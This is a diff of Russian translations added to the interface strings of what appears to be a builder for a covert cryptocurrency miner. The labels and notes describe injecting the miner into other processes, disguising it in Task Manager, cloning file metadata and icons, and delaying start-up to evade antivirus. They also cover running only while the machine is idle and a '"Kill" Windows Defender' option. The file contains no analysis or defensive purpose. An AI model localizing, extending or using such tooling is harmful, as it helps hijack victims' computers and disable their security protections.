@@ -1,0 +1,53 @@
+151 Me.TooltipHelper.SetToolTip(Me.helpLabelPassword, "The password...... -- Пароль для подключения. Для некоторых пулов нужно оставить это поле пустым, другие же могут требовать пароль или как в случае SupportXMR -  имя "воркера"  
+167  Me.TooltipHelper.SetToolTip(Me.helpLabelPool, "The pool.... -- Пул для майнинга (Пример: xmr.examplepool.com:8080)
+180 Me.TooltipHelper.SetToolTip(Me.Label32, "The Installed miners..... -- Имя майнера для "Диспетчера задач" и подобных программ
+194 Me.TooltipHelper.SetToolTip(Me.Label31, "The location... -- Место для сохранения установленного майнера
+207 Me.TooltipHelper.SetToolTip(Me.Label35, "The ass.... -- Инфа о созданном файле, еще эта инфа будет отображаться в диспетчере задач 
+234 Me.TooltipHelper.SetToolTip(Me.Label25, "The amount of... -- Время до перехода в 'idle' режим
+247 Me.TooltipHelper.SetToolTip(Me.Label21, "The amount of CPU the.... -- Процент использования ресурсов процессора во время простоя компьютера
+260 Me.TooltipHelper.SetToolTip(Me.Label17, "SSL/TLS increases perfo... -- Протокол SSL/TLS повышает стабильность но используется не на всех пулах. Обязательно посмотри поддерживается ли он на твоем пуле, если он тебе нужен, конечно
+275 Me.TooltipHelper.SetToolTip(Me.Label16, "Only enable if mining... -- Включай если используешь nicehash.com или там где используется что-то вроде xmrig-porxy
+289 Me.TooltipHelper.SetToolTip(Me.Label14, "GPU Mining for some... -- Из названия понятно, что оно используется для майнинга на видеокартах, что тут еще можно сказать, задетектить майнер становится легче, вот что, да и размер файла майнера становится больше
+317 Me.TooltipHelper.SetToolTip(Me.helpLabelMaxCPU, "The max amount.... -- Максимальное значение использования ресурсов процессора вообще
+330 Me.TooltipHelper.SetToolTip(Me.Label28, "The time to wait before injecting... -- Время ожидания перед внедрением и запуском майнера. Иногда обходит некоторые антивирусы
+
+
+439 Me.TabPage1.Text = "Main" -- Основное
+461 Me.Label10.Text = "For help please check the " -- Для получения дополнительной информации читайте 
+471 Me.Label5.Text = "Inject Into:" -- Внедрить в
+539 Me.Label6.Text = "Wallet Address/User:" -- Кошелёк Адрес/Пользователь:
+549 Me.Label7.Text = "Password (if required):" -- Пароль (если необходимо)
+584 Me.TabPage2.Text = "Install" -- Установка
+595 Me.Label37.Text = "Watchdog:" -- Скрыть файл
+607 Me.toggleWatchdog.Text = "Enable GPU Mining" -- Вкл GPU майнинг
+621 Me.chkInstall.Text = "Disabled" -- Выкл
+648 Me.Label2.Text = "Save Path:" -- Путь распаковки
+658 Me.Label1.Text = "Filename:" -- Имя файла
+701 Me.TabPage3.Text = "Assembly" -- Сборка
+710 Me.Label9.Text = "Version:" -- Версия
+724 Me.chkAssembly.Text = "Disabled" -- Выкл
+736 Me.btn_assemblyRandom.Text = "Randomize" -- Рандом
+765 Me.btn_assemblyClone.Text = "Clone File" -- Копировать файл
+931 Me.TabPage4.Text = "Icon" -- Иконка
+945 Me.chkIcon.Text = "Disabled" -- Выкл
+983 Me.txtIconPath.Text = "Path to icon..." -- Путь до иконки
+1025 Me.TabPage6.Text = "Mining" -- Майнер 
+1035 Me.MephButton1.Text = "Advanced Options" -- Продвинутые настройки
+1046 Me.Label27.Text = "Stealth:" -- Скрытность
+1058 
+1069 Me.Label24.Text = "Minutes" -- Минуты
+1080 Me.Label23.Text = "Idle Wait:" -- Время 
+1297 Me.Label29.Text = "Seconds" -- cекунд
+1308 Me.Label30.Text = "Start Delay:" -- Задержка запуска
+
+
+---
+
+216 Me.Label10.Text = "Run as Administrator:" -- Запуск от имени администратора
+276 Me.Label20.Text = "Advanced Parameters:" --  Дополнительные параметры
+290 Me.chkAdvanced.Text = "Disabled" -- Выкл
+319 Me.Label2.Text = "Pause for Obfuscation:" -- Пауза для "обфускации"
+344 Me.Label4.Text = """Kill"" Windows Defender:" -- "Убить" Windows Defender
+382 Me.chkRemoteConfig.Text = "Disabled" -- Выкл
+411 Me.Label8.Text = "Create Uninstaller:" -- Создать деинсталлятор
+
